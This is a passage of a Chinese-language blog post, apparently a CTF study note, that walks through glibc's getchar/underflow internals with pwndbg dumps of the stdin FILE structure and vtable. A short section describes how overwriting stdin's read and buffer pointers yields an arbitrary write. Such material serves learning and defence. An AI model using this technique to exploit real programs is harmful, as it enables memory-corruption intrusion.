_IO_JUMPS(THIS) (THIS)-&gt;vtable</code><br><code>extern const struct _IO_jump_t _IO_file_jumps;</code><br>这里将vtable指向<code>_IO_file_jumps</code>。这步很重要，后面的输入输出函数都会用到。</p><p>真正完成打开文件操作的函数是_IO_file_fopen.<br><code># define _IO_new_file_fopen _IO_file_fopen</code><br>该函数就是根据传入的modes，例如”r”,”r+”等来设置flag位，最终调用open系统调用完成打开文件操作。</p><h4 id="getchar函数："><a href="#getchar函数：" class="headerlink" title="getchar函数："></a>getchar函数：</h4><p>这里以getchar函数为例，其他输入函数最终调用的函数是相同的。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">getchar (void)</span><br><span class="line">&#123;</span><br><span class="line">  int result;</span><br><span class="line">  <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdin</span>); <span class="comment">//获得锁</span></span><br><span class="line">  result = <span class="variable">_IO_getc_unlocked</span> (<span class="variable">_IO_stdin</span>);</span><br><span class="line">  <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdin</span>); <span class="comment">//释放锁</span></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行真正的读入操作前，先获得锁，这是因为在多线程的情况下，多个线程公用一个输入缓冲区，如果不加锁，当前线程正在读入的时候，由于调度，切换至另一个线程，如果他也在进行读入，则可能会读到相同的东西或者覆盖掉前一个线程读入的东西。</p><p>getchar 函数调用了函数<code>_IO_getc_unlocked</code>进行输入。<br>其定义如下：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _IO_getc_unlocked(_fp) \</span></span><br><span class="line">       <span class="function"><span class="params">(_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, <span class="number">0</span>) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)</span></span></span><br></pre></td></tr></table></figure></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># define _IO_BE(<span class="name">expr</span>, res) __builtin_expect ((<span class="name">expr</span>), res)</span><br></pre></td></tr></table></figure><p>__builtin_expect在标准库中使用的地方很多，他并不改变比较的结果，只是表明这个比较结果很有可能是 true还是false，以便来优化汇编代码。详情可以百度下。</p><p><code>_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, 0)</code> 这段代码只是表明<code>(_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end</code>很可能是false。<br>如果<code>(_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end</code>为true则执行<code>__uflow (_fp)</code>，否者执行<code>*(unsigned char *) (_fp)-&gt;_IO_read_ptr++)</code></p><p>看一下_IO_FILE结构中定义的_IO_read_ptr的注释:<code>Current read pointer</code>，<strong>他指的是当前的读入位置，即在输入缓冲区中的位置</strong>。<br>_IO_read_ptr的注释为<code>char* _IO_read_end;    /* End of get area. */</code> 读取缓冲区结束的位置。<br>之前已经说过，我们输入的东西其实是先保存在输入缓冲区中，如果_IO_read_ptr小于_IO_read_end则说明，并没有到输入缓冲区的尽头，则只需返回_IO_read_ptr所指向的一字节的内容，然后_IO_read_ptr的大小增加1，指向下一个字节。<br>如果_IO_read_ptr大于等于_IO_read_end，则说明已经读取到尽头，则需要重新从设备中读取数据到缓冲区，从这里可以看出，最初的时候，_IO_read_ptr是和_IO_read_end相等的，因为这样才会从键盘中进行读取，否者缓冲区中是没有内容的。</p><p>看一下__uflow的定义:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">__uflow</span> (<span class="variable">_IO_FILE</span> *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_vtable_offset</span> (fp) == <span class="number">0</span> &amp;&amp; <span class="variable">_IO_fwide</span> (fp, -<span class="number">1</span>) != -<span class="number">1</span>)</span><br><span class="line">    return EOF;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_mode</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="variable">_IO_fwide</span> (fp, -<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_in_put_mode</span> (fp))</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">_IO_switch_to_get_mode</span> (fp) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">    return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>++;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_in_backup</span> (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">_IO_switch_to_main_get_area</span> (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_have_markers</span> (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;<span class="variable">_IO_read_end</span>))</span><br><span class="line">return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">_IO_have_backup</span> (fp))</span><br><span class="line">    <span class="variable">_IO_free_backup_area</span> (fp);</span><br><span class="line">  return <span class="variable">_IO_UFLOW</span> (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>前面的操作在干啥我也不太清楚，但是最终调用了<code>return _IO_UFLOW (fp);</code><br><code>#define _IO_UFLOW(FP) JUMP0 (__uflow, FP)</code><br><code>#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</code><br>宏特别多，这些宏都是一套套一套，只说下最后的功能是：在其对应的vtable中调用了 <strong>uflow。不太清楚这个 </strong>uflow是啥，于是动态调试一波:<br>以stdin为例：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="variable">_IO_2_1_stdin_</span> </span><br><span class="line">$<span class="number">7</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    <span class="variable">_flags</span> = -<span class="number">72540024</span>, </span><br><span class="line">    <span class="variable">_IO_read_ptr</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_read_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_read_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_ptr</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_buf_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_buf_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_save_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_backup_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_save_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_markers</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_chain</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_fileno</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_flags2</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_old_offset</span> = -<span class="number">1</span>, </span><br><span class="line">    <span class="variable">_cur_column</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_vtable_offset</span> = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    <span class="variable">_shortbuf</span> = <span class="string">""</span>, </span><br><span class="line">    <span class="variable">_lock</span> = <span class="number">0</span>x7ffff7dd3790 &lt;<span class="variable">_IO_stdfile_0_lock</span>&gt;, </span><br><span class="line">    <span class="variable">_offset</span> = -<span class="number">1</span>, </span><br><span class="line">    <span class="variable">_codecvt</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_wide_data</span> = <span class="number">0</span>x7ffff7dd19c0 &lt;<span class="variable">_IO_wide_data_0</span>&gt;, </span><br><span class="line">    <span class="variable">_freeres_list</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_freeres_buf</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">__pad5</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_mode</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_unused2</span> = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0</span>x7ffff7dd06e0 &lt;<span class="variable">_IO_file_jumps</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vtable是_IO_file_jumps,</p><p>他里面的内容是<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="variable">_IO_file_jumps</span></span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  <span class="variable">__dummy</span> = <span class="number">0</span>, </span><br><span class="line">  <span class="variable">__dummy2</span> = <span class="number">0</span>, </span><br><span class="line">  <span class="variable">__finish</span> = <span class="number">0</span>x7ffff7a869c0 &lt;<span class="variable">_IO_new_file_finish</span>&gt;, </span><br><span class="line">  <span class="variable">__overflow</span> = <span class="number">0</span>x7ffff7a87730 &lt;<span class="variable">_IO_new_file_overflow</span>&gt;, </span><br><span class="line">  <span class="variable">__underflow</span> = <span class="number">0</span>x7ffff7a874a0 &lt;<span class="variable">_IO_new_file_underflow</span>&gt;, </span><br><span class="line">  <span class="variable">__uflow</span> = <span class="number">0</span>x7ffff7a88600 &lt;<span class="variable">__GI__IO_default_uflow</span>&gt;, </span><br><span class="line">  <span class="variable">__pbackfail</span> = <span class="number">0</span>x7ffff7a89980 &lt;<span class="variable">__GI__IO_default_pbackfail</span>&gt;, </span><br><span class="line">  <span class="variable">__xsputn</span> = <span class="number">0</span>x7ffff7a861e0 &lt;<span class="variable">_IO_new_file_xsputn</span>&gt;, </span><br><span class="line">  <span class="variable">__xsgetn</span> = <span class="number">0</span>x7ffff7a85ec0 &lt;<span class="variable">__GI__IO_file_xsgetn</span>&gt;, </span><br><span class="line">  <span class="variable">__seekoff</span> = <span class="number">0</span>x7ffff7a854c0 &lt;<span class="variable">_IO_new_file_seekoff</span>&gt;, </span><br><span class="line">  <span class="variable">__seekpos</span> = <span class="number">0</span>x7ffff7a88a00 &lt;<span class="variable">_IO_default_seekpos</span>&gt;, </span><br><span class="line">  <span class="variable">__setbuf</span> = <span class="number">0</span>x7ffff7a85430 &lt;<span class="variable">_IO_new_file_setbuf</span>&gt;, </span><br><span class="line">  <span class="variable">__sync</span> = <span class="number">0</span>x7ffff7a85370 &lt;<span class="variable">_IO_new_file_sync</span>&gt;, </span><br><span class="line">  <span class="variable">__doallocate</span> = <span class="number">0</span>x7ffff7a7a180 &lt;<span class="variable">__GI__IO_file_doallocate</span>&gt;, </span><br><span class="line">  <span class="variable">__read</span> = <span class="number">0</span>x7ffff7a861a0 &lt;<span class="variable">__GI__IO_file_read</span>&gt;, </span><br><span class="line">  <span class="variable">__write</span> = <span class="number">0</span>x7ffff7a85b70 &lt;<span class="variable">_IO_new_file_write</span>&gt;, </span><br><span class="line">  <span class="variable">__seek</span> = <span class="number">0</span>x7ffff7a85970 &lt;<span class="variable">__GI__IO_file_seek</span>&gt;, </span><br><span class="line">  <span class="variable">__close</span> = <span class="number">0</span>x7ffff7a85340 &lt;<span class="variable">__GI__IO_file_close</span>&gt;, </span><br><span class="line">  <span class="variable">__stat</span> = <span class="number">0</span>x7ffff7a85b60 &lt;<span class="variable">__GI__IO_file_stat</span>&gt;, </span><br><span class="line">  <span class="variable">__showmanyc</span> = <span class="number">0</span>x7ffff7a89af0 &lt;<span class="variable">_IO_default_showmanyc</span>&gt;, </span><br><span class="line">  <span class="variable">__imbue</span> = <span class="number">0</span>x7ffff7a89b00 &lt;<span class="variable">_IO_default_imbue</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以最终调用的函数其实是:<code>__GI__IO_default_uflow.</code></p><p>看下他的定义:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>他又调用了<code>_IO_UNDERFLOW (fp)</code></p><p><code>#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</code></p><p>同理，这个是调用了<code>_IO_new_file_underflow</code><br>追了这么久，这个函数就是最底层的操作了，用来读取你的键盘输入.<br>看下他的定义：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">_IO_new_file_underflow</span> (<span class="variable">_IO_FILE</span> *fp) <span class="comment">//最底层的输入操作</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">_IO_ssize_t</span> <span class="built_in">count</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_EOF_SEEN</span>)</span><br><span class="line">    return (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_NO_READS</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>;</span><br><span class="line">      <span class="variable">__set_errno</span> (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">    return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_buf_base</span> == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_save_base</span> != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;<span class="variable">_IO_save_base</span>);</span><br><span class="line">  fp-&gt;<span class="variable">_flags</span> &amp;= ~<span class="variable">_IO_IN_BACKUP</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="variable">_IO_doallocbuf</span> (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; (<span class="variable">_IO_LINE_BUF</span>|<span class="variable">_IO_UNBUFFERED</span>))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      <span class="variable">_IO_flush_all_linebuffered</span> ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn't</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="variable">_IO_stdout</span>-&gt;<span class="variable">_flags</span> &amp; (<span class="variable">_IO_LINKED</span> | <span class="variable">_IO_NO_WRITES</span> | <span class="variable">_IO_LINE_BUF</span>))</span><br><span class="line">  == (<span class="variable">_IO_LINKED</span> | <span class="variable">_IO_LINE_BUF</span>))</span><br><span class="line"><span class="variable">_IO_OVERFLOW</span> (<span class="variable">_IO_stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_switch_to_get_mode</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_base</span> = fp-&gt;<span class="variable">_IO_read_ptr</span> = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_end</span> = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_write_base</span> = fp-&gt;<span class="variable">_IO_write_ptr</span> = fp-&gt;<span class="variable">_IO_write_end</span> <span class="comment">//都等于了_IO_buf_base</span></span><br><span class="line">    = fp-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">count</span> = <span class="variable">_IO_SYSREAD</span> (fp, fp-&gt;<span class="variable">_IO_buf_base</span>,</span><br><span class="line">       fp-&gt;<span class="variable">_IO_buf_end</span> - fp-&gt;<span class="variable">_IO_buf_base</span>); <span class="comment">//从这里知道 _IO_buf_base是读入起始位置，_IO_buf_end是结束位置。</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> &lt;= <span class="number">0</span>) <span class="comment">//读入时出错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> == <span class="number">0</span>)</span><br><span class="line">fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_EOF_SEEN</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>, <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;<span class="variable">_IO_read_end</span> += <span class="built_in">count</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;<span class="variable">_offset</span> = <span class="variable">_IO_pos_BAD</span>;</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_offset</span> != <span class="variable">_IO_pos_BAD</span>)</span><br><span class="line">    <span class="variable">_IO_pos_adjust</span> (fp-&gt;<span class="variable">_offset</span>, <span class="built_in">count</span>);</span><br><span class="line">  return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键看这些<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ....</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="title">if</span> (fp-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> &lt; fp-&gt;</span>_IO_read_end)<span class="comment">//需要绕过</span></span><br><span class="line">   <span class="function"><span class="title">return</span> *(unsigned char *) fp-&gt;</span>_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  ....</span><br><span class="line"><span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">   <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">   <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = fp-&gt;</span>_IO_write_end <span class="comment">//都等于了_IO_buf_base</span></span><br><span class="line">   = <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_base;</span><br><span class="line"> <span class="function"><span class="title">count</span> = _IO_SYSREAD (fp, fp-&gt;</span>_IO_buf_base,</span><br><span class="line">       <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">buf_end</span> - fp-&gt;</span>_IO_buf_base); <span class="comment">//从这里知道 _IO_buf_base是读入起始位置，_IO_buf_end是结束位置。</span></span><br><span class="line"><span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_end += count;</span><br></pre></td></tr></table></figure></p><p>这里的_IO_SYSREAD最终会调用read，从你的键盘读入数据。且_IO_read_ptr等于了_IO_buf_base,_IO_read_end等于了_IO_buf_base+count.再次调用getchar时又可以读取正常读取缓冲区了。从这里可以知道，如果控制了_IO_buf_base，就可以造成任意写的能力。</p><p>总结一下：getchar函数会先判断是否已经读完了输入缓冲区（_IO_read_ptr&gt;=_IO_read_end？？？),如果输入缓冲区还没有读完，则返回_IO_read_ptr指向的一字节内容，并自增1，如果输入缓冲区已经读完了，则最终调用_IO_new_file_underflow 重新进行读取，填充缓冲区，并调整_IO_read_ptr和_IO_read_end指针的位置。</p><h5 id="利用手法："><a href="#利用手法：" class="headerlink" title="利用手法："></a>利用手法：</h5><p>修改stdin结构体：<br>覆盖 stdin 里的_IO_read_ptr和_IO_read_end，使_IO_read_ptr&gt;= _IO_read_end，以绕过:<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(unsigned <span class="built_in">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure></p><p>然后修改_IO_buf_base为你想写入的位置，_IO_buf_end为你想写入的位置的末尾即可。</p><h4 id="putchar："><a href="#putchar：" class="headerlink" title="putchar："></a>putchar：</h4><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span></span><br><span class="line">putchar (<span class="built_in">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> <span class="literal">result</span>;</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="literal">result</span> = _IO_putc_unlocked (c, _IO_stdout);</span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和getchar很像，调用了_IO_putc_unlocked，<br>其定义如下:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _IO_putc_unlocked(_ch, _fp) 